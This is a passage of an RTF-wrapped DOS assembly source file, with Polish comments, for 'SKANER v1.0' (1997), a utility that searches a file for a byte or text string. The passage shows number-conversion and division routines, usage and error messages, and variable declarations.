\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov al,ah}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 and al,15                           ; wyizoluj 4 bity (0..3)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Bin2HexUnInt4:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xlatb                               ; al=byte ptr ds:[bx+al]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov [si],al                         ; zachowaj znak w buforze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 inc si                              ; zwieksz indeks}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powrot z wen. procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Bin2HexUnInt32  endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Bin2DecUnInt32  proc near                           ; wyswietla liczbe 32 bitowa bez znaku dziesietnie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ax                             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push bx                             ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push dx                             ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push si                             ; --- zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,[si]                         ; wez ofset do liczby 32 bitowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,[si]                         ; - wczytaj liczbe do DX:AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,[si+2]                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,offset Hex2DecBufor+10       ; ustaw na koniec bufora, bo zapis od konca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov byte ptr ds:[si],0              ; utworz ASCIIZ (dodaj zero na koncu)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    DzielPrzez10:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bx,10                           ; dziel DX:AX przez BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Dziel32                        ; w bx reszta z dzielenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add bl,'0'                          ; dodaj ASCII "0"}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 dec si                              ; zmniejsz indeks do tablicy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov byte ptr ds:[si],bl             ; zapisz cyfre}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 or  dx,dx                           ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jnz DzielPrzez10                    ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 or  ax,ax                           ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jnz DzielPrzez10                    ; --- czy liczba jest juz 0 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Druk                           ; wyswietl lancuch z liczba po konwersji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop si                              ;  --- przywroc zmienione rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop dx                              ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop bx                              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ax                              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Bin2DecUnInt32  endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dziel32         proc near                           ; dziel (dx:ax)/bx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push bp                             ; zachowaj bp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ax                             ; zachowaj mniejsza czesc liczby 32 bitowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,dx                           ; przenies b. znacz. czesc do mniej. znacz.}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xor dx,dx                           ; i wyzeruj dx , dx:ax = > 0:dx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 div bx                              ; podziel (0:dx)/bx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bp,ax                           ; calosc z dzielenia, to wieksza czesc wyniku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ax                              ; przywroc do AX mniej znaczaca liczbe z poczatku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 div bx                              ; dx jest reszta z dzielenia b. znacz. czesci przez BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bx,dx                           ; w bx reszta z dzielenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,bp                           ; dx:ax=liczba podzielona przez bx,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop bp                              ; a w bx reszta z dzielenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dziel32         endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              (teksty komunikatow+zmienne ogolne)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeCopyRight          db CR,LF,'SKANER v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db CR,LF,'   Wywolanie: SKANER NazwaPliku CiagBajtow'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db CR,LF,'   CiagBajtow moze skladac sie z liczb zapisanych heksalnie lub zwyklego'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db CR,LF,'   tekstu np: '}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db CR,LF,'       _ CD 21                - szuka wywolania przerwania 21h'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db CR,LF,'       _ ''wirus''              - szuka slowa "wirus"'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db CR,LF,'       _ ''abc''80C5''def''EE  F6 - szuka lancucha "abc\'c7+def_\'f7"'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeCRLF               db CR,LF,0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeSzukamCiagu        db 'Szukam lancuch "',DrCiag ,'" w pliku "',DrPlik,'"',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeBezBledu           db 'OK !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeBrakParametrow     db 'BLAD : Podaj Parametry !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeBrakNazwyPliku     db 'BLAD : Podaj nazwe pliku !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeBrakCiagu          db 'BLAD : Podaj ciag do wyszukania',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeZlyCiag            db 'BLAD : Podany ciag zawiera bledy !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeBrakPlikuNaDysku   db 'BLAD : Nie moge znalezc pliku "',DrPlik,'"',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeBlad_ARIF          db 'BLAD : Brak dostepu do pliku "',DrPlik,'" (int 24h) !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeZlyAtrybutPliku    db 'BLAD : "',DrPlik,'" to etykieta dysku lub katalog !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeBrakDostepuDoPliku db 'BLAD : Brak dostepu do pliku - nie mozna chwilowo zmienic atrybutow ! ',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeNieMogeOtworzyc    db 'BLAD : Nie moge otworzyc pliku "',DrPlik,'"',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeNieMogeCzytac      db 'BLAD : Nie moge czytac pliku "',DrPlik,'"',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeNieMogeZamknac     db 'BLAD : Nie moge zamknac pliku "',DrPlik,'"',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TePlikZaKrotki       db 'BLAD : Plik "',DrPlik,'" jest krotszy niz ciag !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     OffsetyKomunikatow   dw offset TeBezBledu             ; BlBezBledu           equ 00h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeBrakParametrow       ; BlBrakParametrow     equ 01h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeBrakNazwyPliku       ; BlBrakNazwyPliku     equ 02h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeBrakCiagu            ; BlBrakCiagu          equ 03h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeZlyCiag              ; BlZlyCiag            equ 04h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeBrakPlikuNaDysku     ; BlBrakPlikuNaDysku   equ 05h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeBlad_ARIF            ; BlBlad_ARIF          equ 06h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeZlyAtrybutPliku      ; BlZlyAtrybutPliku    equ 07h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeBrakDostepuDoPliku   ; BlBrakDostepuDoPliku equ 08h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeNieMogeOtworzyc      ; BlNieMogeOtworzyc    equ 09h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeNieMogeCzytac        ; BlNieMogeCzytac      equ 0Ah}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TeNieMogeZamknac       ; BlNieMogeZamknac     equ 0Bh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset TePlikZaKrotki         ; BlPlikZaKrotki       equ 0Ch}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeNieZnalazlem       db 'Nie znalazlem lancucha "',DrCiag ,'" w pliku "',DrPlik,'" !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TeZnalazlem          db 'Ciag "',DrCiag ,'" wystapil '}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db DrUnIntDec}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset IleZnalezionych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db ' raz(y) w pliku "',DrPlik,'" !',0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    TeZnalezionyNaPozycji db 'Ciag "',DrCiag ,'" wystapil na pozycji '}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db DrUnIntHex}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset AdresZnalezienia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db ','}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db DrUnIntDec}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset AdresZnalezienia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db 0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    HexChars              db '0123456789ABCDEF'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TablicaWrostkow          db DrPlik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset NazwaPliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db DrCiag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset Ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db DrUnIntDec}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset Bin2DecUnInt32}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          db DrUnIntHex}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          dw offset Bin2HexUnInt32}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         NumerBledu       db ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         MojAdresPSP      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         AdresCzytania    dd ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         AdresZnalezienia dd ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         Przeczytane      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         IleZnalezionych  dd ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         DlugoscCiagu     dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         AbsDlugoscCiagu  dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         StareDTAOfs      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         StareDTASeg      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         StareI24Ofs      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         StareI24Seg      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
